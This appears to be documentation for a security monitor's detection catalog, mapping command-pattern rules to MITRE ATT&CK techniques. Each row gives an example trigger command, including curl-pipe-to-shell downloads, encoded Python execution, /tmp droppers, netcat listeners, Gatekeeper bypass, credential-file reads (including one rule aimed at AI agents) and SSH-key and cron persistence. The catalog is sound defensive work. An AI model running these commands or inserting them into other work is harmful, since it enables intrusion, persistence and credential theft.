# Leash Detection Catalog

The table below documents command-pattern detections emitted by `detect_dangerous_commands` in `src/collector.rs`.

| Detection name | MITRE ATT&CK ID | Description | Severity | Public source citation | Example trigger command |
|---|---|---|---|---|---|
| `download_pipe_shell` | T1105 | Detects direct download-and-execute pipelines (for example `curl ... \| bash`). | Orange | MITRE ATT&CK T1105 (Ingress Tool Transfer): https://attack.mitre.org/techniques/T1105/ | `curl https://example.com/install.sh | bash` |
| `wget_pipe_shell` | T1105 | Detects `wget` output piped directly to a shell interpreter. | Orange | MITRE ATT&CK T1105 (Ingress Tool Transfer): https://attack.mitre.org/techniques/T1105/ | `wget -O - https://example.com/payload.sh | sh` |
| `base64_decode` | T1027 | Detects base64 decoding commonly used to obfuscate payloads. | Orange | MITRE ATT&CK T1027 (Obfuscated/Compressed Files and Information): https://attack.mitre.org/techniques/T1027/ | `echo ZWNobyBoaQ== | base64 -d` |
| `encoded_python` | T1027 | Detects inline Python execution that includes base64 content. | Red | MITRE ATT&CK T1027 (Obfuscated/Compressed Files and Information): https://attack.mitre.org/techniques/T1027/ | `python3 -c "import base64;exec(base64.b64decode('cHJpbnQoMSk='))"` |
| `eval_execution` | T1059.004 | Detects explicit use of `eval` for dynamic shell execution. | Orange | MITRE ATT&CK T1059.004 (Unix Shell): https://attack.mitre.org/techniques/T1059/004/ | `eval "$(cat /tmp/stage.sh)"` |
| `ssh_unusual_host` | T1021.004 | Detects SSH usage to non-standard/suspicious destination forms. | Orange | MITRE ATT&CK T1021.004 (SSH): https://attack.mitre.org/techniques/T1021/004/ | `ssh root@198.51.100.42` |
| `netcat_listener` | T1048 | Detects netcat in listen mode, often used for ad-hoc C2 or exfil channels. | Orange | MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol): https://attack.mitre.org/techniques/T1048/ | `nc -l -p 4444` |
| `download_exec` | T1222.001 | Detects `chmod +x` combined with download or temp-path execution context. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `chmod +x /tmp/payload` |
| `download_exec_tmpdir` | T1222.001 | Detects explicit download-then-execute flow targeting `/tmp` or `/dev/shm`. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `curl -o /tmp/dropper http://example.com/d && chmod +x /tmp/dropper` |
| `exec_tmpdir` | T1059.004 | Detects executable invocation directly from `/tmp` or `/dev/shm`. | Orange | MITRE ATT&CK T1059.004 (Unix Shell): https://attack.mitre.org/techniques/T1059/004/ | `/dev/shm/runner` |
| `gatekeeper_bypass` | T1553.001 | Detects macOS quarantine removal and Gatekeeper bypass commands (`xattr`). | Orange | MITRE ATT&CK T1553.001 (Gatekeeper Bypass): https://attack.mitre.org/techniques/T1553/001/ | `xattr -d com.apple.quarantine /tmp/payload` |
| `osascript_tmp_exec` | T1059.002 | Detects `osascript` execution from temporary directories. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `osascript /tmp/stage.scpt` |
| `osascript_inline_sensitive` | T1059.002 | Detects inline AppleScript commands with sensitive automation keywords. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `osascript -e 'tell application "System Events" to keystroke "password"'` |
| `osacompile_with_curl` | T1059.002 | Detects AppleScript compilation combined with network retrieval. | Orange | MITRE ATT&CK T1059.002 (AppleScript): https://attack.mitre.org/techniques/T1059/002/ | `curl -fsSL https://x/y | osacompile -o /tmp/x.scpt` |
| `fileless_pipeline_decode` | T1059.004 | Detects multi-stage fileless pipeline with `curl`, `base64 -d`, and `gunzip`. | Orange | Unit 42, “CURL to Shell” tradecraft observations: https://unit42.paloaltonetworks.com/ | `curl -fsSL http://example.com/a | base64 -d | gunzip` |
| `fileless_pipeline_python` | T1059.004 | Detects direct network pipeline to Python interpreter. | Orange | Red Canary ATT&CK mappings for scripting abuse: https://redcanary.com/threat-detection-report/techniques/ | `curl -fsSL http://example.com/a | python3` |
| `curl_raw_ip` | T1071.001 | Detects `curl` downloads from raw non-RFC1918 IPv4 addresses. | Orange | MITRE ATT&CK T1071.001 (Web Protocols): https://attack.mitre.org/techniques/T1071/001/ | `curl -O http://8.8.8.8/payload` |
| `wget_raw_ip` | T1071.001 | Detects `wget` downloads from raw non-RFC1918 IPv4 addresses. | Orange | MITRE ATT&CK T1071.001 (Web Protocols): https://attack.mitre.org/techniques/T1071/001/ | `wget http://1.2.3.4/tool` |
| `launchd_persistence` | T1543.001 | Detects writes to LaunchDaemons or LaunchAgents for macOS persistence. | Orange | MITRE ATT&CK T1543.001 (Create or Modify System Process: Launch Agent): https://attack.mitre.org/techniques/T1543/001/ | `echo plist > ~/Library/LaunchAgents/com.bad.plist` |
| `kube_config_access` | T1552.001 | Detects reads of Kubernetes client config that may contain credentials. | Orange | MITRE ATT&CK T1552.001 (Credentials In Files): https://attack.mitre.org/techniques/T1552/001/ | `cat ~/.kube/config` |
| `touch_mkdir_sensitive` | T1005 | Detects directory creation or touch activity in sensitive filesystem paths. | Orange | MITRE ATT&CK T1005 (Data from Local System): https://attack.mitre.org/techniques/T1005/ | `mkdir /etc/cron.hourly/.cache` |
| `write_sensitive_path` | T1222.001 | Detects writes/copies/moves into sensitive paths under `/etc`, `/usr`, `/var`, `/boot`, or `/Library`. | Red | MITRE ATT&CK T1222.001 (Linux and Mac File and Directory Permissions Modification): https://attack.mitre.org/techniques/T1222/001/ | `cp payload /etc/cron.d/system-update` |
| `rmm_suspicious_parent` | T1219 | Detects ScreenConnect/AnyDesk/TeamViewer/ConnectWise processes launched by suspicious non-standard parents (especially IDE parents). | Red | Aikido Security research on RMM abuse in dev environments (Jan 2026): https://www.aikido.dev/ | `code -> screenconnect --session abc` |
| `npm_pip_postinstall_shell` | T1195.002 | Detects shell interpreters spawned as children of `npm`/`pip` install processes. | Orange | Socket and Snyk supply-chain research on install-script abuse: https://socket.dev/ and https://snyk.io/ | `npm install evil-pkg` followed by `sh -c ./postinstall.sh` |
| `hidden_unicode_command` | T1027.013 | Detects hidden Unicode in command lines, including PUA (`U+E000`-`U+F8FF`) and invisible format chars (`U+200B`, `U+200D`, `U+FEFF`). | Red | Veracode and TrueSec GlassWorm reporting on hidden Unicode obfuscation: https://www.veracode.com/ and https://www.truesec.com/ | `curl​ https://example.com/install.sh \| sh` |
| `ai_agent_credential_access` | T1552 | Detects read-style commands targeting `.env`, `.npmrc`, `.netrc`, `.gitconfig` from AI-agent-like process trees. | Red | OWASP and Obsidian Security guidance on agent credential exposure: https://owasp.org/ and https://www.obsidiansecurity.com/ | `python -> cat ~/.npmrc` |
| `ai_skill_directory_spawn` | T1059 | Detects process execution with working directories under AI skill/plugin/extension paths. | Orange | Snyk ToxicSkills research: https://snyk.io/ | `cwd=/home/user/.codex/skills/...` |
| `pyinstaller_unexpected_location` | T1195.002 | Detects `_MEIPASS`/`_MEI*` execution context in dependency trees (`node_modules`, `site-packages`, `dist-packages`). | Red | Socket research on malicious package delivery with PyInstaller payloads: https://socket.dev/ | `/home/user/project/node_modules/pkg/_MEI12345/payload` |
| `package_install_external_ip` | T1071.001 | Detects network-capable child processes under package install parents (`npm`/`pip`/`cargo`/`gem`) reaching external raw IPv4 destinations. | Orange | Sigma rule patterns for suspicious installer-network behavior: https://github.com/SigmaHQ/sigma | `npm install ...` then `curl http://8.8.8.8/payload.sh` |
| `ld_preload_set` | T1574.006 | Detects processes with `LD_PRELOAD` explicitly set in environment. | Red | MITRE ATT&CK T1574.006 (Dynamic Linker Hijacking): https://attack.mitre.org/techniques/T1574/006/ | `LD_PRELOAD=/tmp/libx.so /usr/bin/ls` |
| `crontab_modification` | T1053.003 | Detects `crontab -e` and write operations targeting `/var/spool/cron/` or `/etc/cron.d/`. | Orange | MITRE ATT&CK T1053.003 (Cron): https://attack.mitre.org/techniques/T1053/003/ | `echo \"* * * * * ...\" > /etc/cron.d/system-update` |
| `ssh_authorized_keys_modification` | T1098.004 | Detects write operations to `~/.ssh/authorized_keys`. | Red | MITRE ATT&CK T1098.004 (SSH Authorized Keys): https://attack.mitre.org/techniques/T1098/004/ | `echo ssh-rsa AAAA... >> ~/.ssh/authorized_keys` |

## Severity model

Leash assigns detection event severity in `ProcessCollector::analyze`:
- `Red`: `write_sensitive_path`, `download_exec`, `download_exec_tmpdir`, `encoded_python`, `rmm_suspicious_parent`, `hidden_unicode_command`, `ai_agent_credential_access`, `pyinstaller_unexpected_location`, `ld_preload_set`, `ssh_authorized_keys_modification`
- `Orange`: all other command-pattern detections

Reference: `src/collector.rs`.
